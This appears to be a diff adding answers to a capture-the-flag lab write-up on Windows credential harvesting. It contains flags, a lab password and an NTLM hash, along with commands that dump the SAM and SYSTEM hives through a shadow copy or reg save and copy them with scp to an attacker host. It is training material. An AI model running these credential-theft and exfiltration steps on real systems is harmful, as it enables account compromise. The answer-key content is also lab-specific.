@@ -156,7 +156,35 @@ Gaining initial access to a target network enables attackers to perform various 
 
 * Using the "reg query" command, search for the value of the "flag" keyword in the Windows registry?
 
+	`7tyh4ckm3`
+
+	* RDP target machine
+	
+		```
+		xfreerdp /v:10.10.76.132 /u:thm /p:'Passw0rd!'
+		```
+
+		![task3-rdp](./images/task3-rdp.png)
+
+	* Run `cmd` and run this command
+	
+		```
+		reg query HKLM /f flag /t REG_SZ /s
+		```
+
+		![task3-flag](./images/task3-flag.png)
+
 * Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
+
+	`Passw0rd!@#`
+
+	* Run `powershell` and run this command
+	
+		```
+		Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
+		```
+
+		![task3-victim](./images/task3-victim.png)
 
 ## Task 4 - Local Windows Credentials
 
@@ -232,6 +260,89 @@ Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are g
 ### Answer the questions below
 
 * Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?
+
+	`98d3a787a80d08385cea7fb4aa2a4261`
+
+	* Volume Shadow Copy Service method
+	
+		* Run `cmd` with administrator privileges on target system
+		
+			![task4-cmd](./images/task4-cmd.png)
+
+		* Then execute the following wmic command
+		
+			```
+			wmic shadowcopy call create Volume='C:\'
+			```
+
+			![task4-wmic](./images/task4-wmic.png)
+
+		* Use the `vssadmin`, Volume Shadow Copy Service administrative command-line tool
+		
+			```
+			vssadmin list shadows
+			```
+
+			![task4-vssadmin](./images/task4-vssadmin.png)
+
+		* Copying the SAM and SYSTEM file from the Shadow Volume
+		
+			```
+			copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\system C:\users\thm\Documents\system
+
+			copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\sam C:\users\thm\Documents\sam
+			```
+
+			![task4-sam](./images/task4-sam.png)
+
+		* Copy the SAM and SYSTEM file to attacher machine
+		
+			```
+			scp sam kakakseram@10.4.60.166:/home/kakakseram/THM/CredentialsHarvesting
+			scp system kakakseram@10.4.60.166:/home/kakakseram/THM/CredentialsHarvesting
+			```
+
+			![task4-scp](./images/task4-scp.png)
+
+		* Decrypting SAM database using Impacket `SecretsDump` script locally 
+		
+			```
+			python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL
+			```
+
+			![task4-hash](./images/task4-hash.png)
+
+	* Registry Hives method
+	
+		* Run `cmd` with administrator privileges on target system
+		
+			![task4-cmd](./images/task4-cmd.png)
+
+		* Save SAM and SYSTEM files from the registry
+		
+			```
+			reg save HKLM\sam C:\Users\thm\Documents\sam-reg
+			reg save HKLM\system C:\Users\thm\Documents\system-reg
+			```
+
+			![task4-reg](./images/task4-reg.png)
+
+		* Copy the SAM and SYSTEM file to attacher machine
+		
+			```
+			scp sam-reg kakakseram@10.4.60.166:/home/kakakseram/THM/CredentialsHarvesting
+			scp system-reg kakakseram@10.4.60.166:/home/kakakseram/THM/CredentialsHarvesting
+			```
+
+			![task4-scp-reg](./images/task4-scp-reg.png)
+
+		* Decrypting SAM database using Impacket `SecretsDump` script locally 
+		
+			```
+			python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
+			```
+
+			![task4-hash-reg](./images/task4-hash-reg.png)
 
 ## Task 5 - Local Security Authority Subsystem Service (LSASS)
 
